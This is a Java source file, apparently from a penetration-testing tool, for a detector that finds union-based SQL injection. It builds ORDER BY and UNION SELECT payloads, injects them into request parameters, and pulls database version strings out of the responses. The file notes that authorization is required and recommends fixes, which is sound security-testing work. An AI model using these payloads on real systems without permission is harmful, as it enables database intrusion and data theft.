package com.security.sqli.core.detector;

import com.security.sqli.core.http.HttpClient;
import com.security.sqli.core.model.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Detector for Union-based SQL injection vulnerabilities.
 *
 * Union-based SQL injection occurs when an attacker can use the UNION operator
 * to combine the results of the original query with results from injected queries.
 *
 * AUTHORIZATION REQUIRED: This detector must only be used against systems
 * you own or have explicit written permission to test.
 */
public class UnionBasedDetector {
    private static final Logger logger = LoggerFactory.getLogger(UnionBasedDetector.class);

    private final HttpClient httpClient;
    private static final int MAX_COLUMNS = 10; // Maximum columns to test

    // Markers to identify injected data
    private static final String MARKER_PREFIX = "SQLINJTEST";
    private static final Pattern MARKER_PATTERN = Pattern.compile(MARKER_PREFIX + "\\d+");

    public UnionBasedDetector(HttpClient httpClient) {
        this.httpClient = httpClient;
    }

    /**
     * Tests a URL parameter for Union-based SQL injection.
     *
     * @param request Base HTTP request
     * @param parameterName Parameter to test
     * @param originalValue Original parameter value
     * @return Vulnerability if found, null otherwise
     */
    public Vulnerability testParameter(HttpRequest request, String parameterName,
                                      String originalValue) {
        logger.info("Testing parameter '{}' for Union-based SQL injection", parameterName);

        // Step 1: Determine number of columns
        int columnCount = determineColumnCount(request, parameterName);

        if (columnCount == -1) {
            logger.info("Could not determine column count for parameter '{}'", parameterName);
            return null;
        }

        logger.info("Detected {} columns in original query", columnCount);

        // Step 2: Find injectable column positions
        List<Integer> injectableColumns = findInjectableColumns(request, parameterName, columnCount);

        if (injectableColumns.isEmpty()) {
            logger.info("No injectable column positions found for parameter '{}'", parameterName);
            return null;
        }

        logger.info("Found injectable column positions: {}", injectableColumns);

        // Step 3: Attempt data extraction
        UnionTestResult testResult = attemptDataExtraction(request, parameterName,
                columnCount, injectableColumns.get(0));

        if (testResult.isSuccessful()) {
            logger.info("Union-based SQL injection CONFIRMED in parameter '{}'", parameterName);
            return buildVulnerability(request, parameterName, columnCount,
                    injectableColumns, testResult);
        }

        logger.info("No Union-based SQL injection found in parameter '{}'", parameterName);
        return null;
    }

    /**
     * Determines the number of columns in the original query using ORDER BY.
     */
    private int determineColumnCount(HttpRequest request, String parameterName) {
        // Get baseline response
        HttpResponse baseline = httpClient.execute(request);
        if (!baseline.isSuccessful()) {
            return -1;
        }

        // Binary search for column count using ORDER BY
        int low = 1, high = MAX_COLUMNS;
        int validColumns = -1;

        while (low <= high) {
            int mid = (low + high) / 2;

            String payload = originalValueOrEmpty(request, parameterName) + "' ORDER BY " + mid + "--";
            HttpRequest testRequest = cloneAndInjectPayload(request, parameterName, payload);
            HttpResponse response = httpClient.execute(testRequest);

            if (response.isSuccessful() && !containsError(response.getBody())) {
                validColumns = mid;
                low = mid + 1;
            } else {
                high = mid - 1;
            }
        }

        return validColumns;
    }

    /**
     * Finds which column positions reflect data in the response.
     */
    private List<Integer> findInjectableColumns(HttpRequest request, String parameterName,
                                                int columnCount) {
        List<Integer> injectableColumns = new ArrayList<>();

        // Build UNION SELECT with numbered markers
        StringBuilder unionQuery = new StringBuilder("' UNION SELECT ");
        for (int i = 1; i <= columnCount; i++) {
            if (i > 1) unionQuery.append(",");
            unionQuery.append("'").append(MARKER_PREFIX).append(i).append("'");
        }
        unionQuery.append("--");

        HttpRequest testRequest = cloneAndInjectPayload(request, parameterName, unionQuery.toString());
        HttpResponse response = httpClient.execute(testRequest);

        if (response.isSuccessful()) {
            // Check which markers appear in the response
            Matcher matcher = MARKER_PATTERN.matcher(response.getBody());
            while (matcher.find()) {
                String marker = matcher.group();
                int columnNum = Integer.parseInt(marker.replace(MARKER_PREFIX, ""));
                if (!injectableColumns.contains(columnNum)) {
                    injectableColumns.add(columnNum);
                }
            }
        }

        return injectableColumns;
    }

    /**
     * Attempts to extract data using UNION SELECT.
     */
    private UnionTestResult attemptDataExtraction(HttpRequest request, String parameterName,
                                                  int columnCount, int injectableColumn) {
        UnionTestResult result = new UnionTestResult();

        // Try to extract database version
        String[] versionQueries = buildVersionQueries(columnCount, injectableColumn);

        for (String query : versionQueries) {
            HttpRequest testRequest = cloneAndInjectPayload(request, parameterName, query);
            HttpResponse response = httpClient.execute(testRequest);

            if (response.isSuccessful()) {
                String extractedData = extractDataFromResponse(response.getBody());

                if (extractedData != null && !extractedData.isEmpty()) {
                    result.setSuccessful(true);
                    result.setExtractedData(extractedData);
                    result.setPayload(query);
                    result.setDatabaseType(identifyDatabaseFromVersion(extractedData));
                    break;
                }
            }
        }

        return result;
    }

    /**
     * Builds version extraction queries for different databases.
     */
    private String[] buildVersionQueries(int columnCount, int injectableColumn) {
        List<String> queries = new ArrayList<>();

        String[] versionFunctions = {
                "VERSION()",              // MySQL
                "@@VERSION",              // MySQL, MSSQL
                "version()",              // PostgreSQL
                "BANNER",                 // Oracle (needs FROM v$version)
                "sqlite_version()"        // SQLite
        };

        for (String versionFunc : versionFunctions) {
            StringBuilder query = new StringBuilder("' UNION SELECT ");

            for (int i = 1; i <= columnCount; i++) {
                if (i > 1) query.append(",");

                if (i == injectableColumn) {
                    query.append(versionFunc);
                } else {
                    query.append("NULL");
                }
            }

            query.append("--");
            queries.add(query.toString());
        }

        return queries.toArray(new String[0]);
    }

    /**
     * Extracts meaningful data from response body.
     */
    private String extractDataFromResponse(String responseBody) {
        if (responseBody == null || responseBody.isEmpty()) {
            return null;
        }

        // Look for version strings
        Pattern versionPattern = Pattern.compile(
                "(MySQL|MariaDB|PostgreSQL|Microsoft SQL Server|Oracle|SQLite)[^<>]{0,50}\\d+\\.\\d+",
                Pattern.CASE_INSENSITIVE
        );

        Matcher matcher = versionPattern.matcher(responseBody);
        if (matcher.find()) {
            return matcher.group().trim();
        }

        return null;
    }

    /**
     * Identifies database type from version string.
     */
    private DatabaseType identifyDatabaseFromVersion(String version) {
        if (version == null) return DatabaseType.UNKNOWN;

        String lowerVersion = version.toLowerCase();

        if (lowerVersion.contains("mysql")) return DatabaseType.MYSQL;
        if (lowerVersion.contains("mariadb")) return DatabaseType.MARIADB;
        if (lowerVersion.contains("postgresql") || lowerVersion.contains("postgres"))
            return DatabaseType.POSTGRESQL;
        if (lowerVersion.contains("microsoft sql server") || lowerVersion.contains("mssql"))
            return DatabaseType.MSSQL;
        if (lowerVersion.contains("oracle")) return DatabaseType.ORACLE;
        if (lowerVersion.contains("sqlite")) return DatabaseType.SQLITE;

        return DatabaseType.UNKNOWN;
    }

    /**
     * Checks if response contains error message.
     */
    private boolean containsError(String responseBody) {
        return DatabaseFingerprinter.containsDatabaseError(responseBody);
    }

    /**
     * Builds a vulnerability report.
     */
    private Vulnerability buildVulnerability(HttpRequest request, String parameterName,
                                            int columnCount, List<Integer> injectableColumns,
                                            UnionTestResult testResult) {
        List<Evidence> evidenceList = new ArrayList<>();

        evidenceList.add(Evidence.builder()
                .payload("ORDER BY " + columnCount)
                .observation("Original query has " + columnCount + " columns")
                .build());

        evidenceList.add(Evidence.builder()
                .payload("Injectable column positions: " + injectableColumns)
                .observation("These columns reflect data in the response")
                .build());

        evidenceList.add(Evidence.builder()
                .payload(testResult.getPayload())
                .responseSnippet(testResult.getExtractedData())
                .observation("Successfully extracted data using UNION SELECT")
                .build());

        // Build vulnerability
        Vulnerability vulnerability = Vulnerability.builder()
                .url(request.getUrl())
                .parameter(parameterName)
                .parameterLocation(determineParameterLocation(request, parameterName))
                .type(InjectionType.UNION_BASED)
                .severity(Severity.CRITICAL)
                .databaseType(testResult.getDatabaseType())
                .confidence(95) // High confidence when data extraction succeeds
                .payload(testResult.getPayload())
                .description(buildDescription(parameterName, columnCount,
                        injectableColumns, testResult))
                .recommendation("Use parameterized queries (prepared statements)")
                .recommendation("Implement strict input validation")
                .recommendation("Use ORM frameworks with query builders")
                .recommendation("Limit database user privileges")
                .recommendation("Sanitize error messages in production")
                .build();

        vulnerability.setEvidence(evidenceList);

        return vulnerability;
    }

    /**
     * Builds a description for the vulnerability.
     */
    private String buildDescription(String parameterName, int columnCount,
                                    List<Integer> injectableColumns, UnionTestResult testResult) {
        StringBuilder desc = new StringBuilder();
        desc.append("Union-based SQL injection vulnerability detected in parameter '");
        desc.append(parameterName);
        desc.append("'. ");

        desc.append("The original query has ").append(columnCount).append(" columns. ");
        desc.append("Column positions ").append(injectableColumns)
                .append(" reflect data in the response. ");

        if (testResult.getDatabaseType() != DatabaseType.UNKNOWN) {
            desc.append("Database identified as ")
                    .append(testResult.getDatabaseType().getDisplayName()).append(". ");
        }

        if (testResult.getExtractedData() != null) {
            desc.append("Successfully extracted data: ").append(testResult.getExtractedData()).append(". ");
        }

        desc.append("An attacker can use UNION SELECT to extract any data from the database, ");
        desc.append("including sensitive information from other tables.");

        return desc.toString();
    }

    /**
     * Determines where the parameter is located.
     */
    private String determineParameterLocation(HttpRequest request, String parameterName) {
        if (request.getQueryParams().containsKey(parameterName)) {
            return "query";
        } else if (request.getBody() != null && request.getBody().contains(parameterName)) {
            return "body";
        } else if (request.getHeaders().containsKey(parameterName)) {
            return "header";
        } else if (request.getCookies().containsKey(parameterName)) {
            return "cookie";
        }
        return "unknown";
    }

    /**
     * Gets original value or empty string.
     */
    private String originalValueOrEmpty(HttpRequest request, String parameterName) {
        return request.getQueryParams().getOrDefault(parameterName, "");
    }

    /**
     * Clones a request and injects a payload.
     */
    private HttpRequest cloneAndInjectPayload(HttpRequest original, String parameterName, String payload) {
        HttpRequest clone = cloneRequest(original);

        if (clone.getQueryParams().containsKey(parameterName)) {
            clone.getQueryParams().put(parameterName, payload);
        } else if (clone.getBody() != null && clone.getBody().contains(parameterName + "=")) {
            String originalValue = original.getQueryParams().getOrDefault(parameterName, "");
            String newBody = clone.getBody().replace(
                    parameterName + "=" + originalValue,
                    parameterName + "=" + payload
            );
            clone.setBody(newBody);
        }

        return clone;
    }

    /**
     * Clones an HTTP request.
     */
    private HttpRequest cloneRequest(HttpRequest original) {
        HttpRequest clone = new HttpRequest();
        clone.setUrl(original.getUrl());
        clone.setMethod(original.getMethod());
        clone.setHeaders(new java.util.HashMap<>(original.getHeaders()));
        clone.setQueryParams(new java.util.HashMap<>(original.getQueryParams()));
        clone.setCookies(new java.util.HashMap<>(original.getCookies()));
        clone.setBody(original.getBody());
        clone.setContentType(original.getContentType());
        clone.setTimeoutMs(original.getTimeoutMs());
        clone.setFollowRedirects(original.isFollowRedirects());
        return clone;
    }

    /**
     * Result of union-based test.
     */
    private static class UnionTestResult {
        private boolean successful;
        private String extractedData;
        private String payload;
        private DatabaseType databaseType = DatabaseType.UNKNOWN;

        public boolean isSuccessful() {
            return successful;
        }

        public void setSuccessful(boolean successful) {
            this.successful = successful;
        }

        public String getExtractedData() {
            return extractedData;
        }

        public void setExtractedData(String extractedData) {
            this.extractedData = extractedData;
        }

        public String getPayload() {
            return payload;
        }

        public void setPayload(String payload) {
            this.payload = payload;
        }

        public DatabaseType getDatabaseType() {
            return databaseType;
        }

        public void setDatabaseType(DatabaseType databaseType) {
            this.databaseType = databaseType;
        }
    }
}
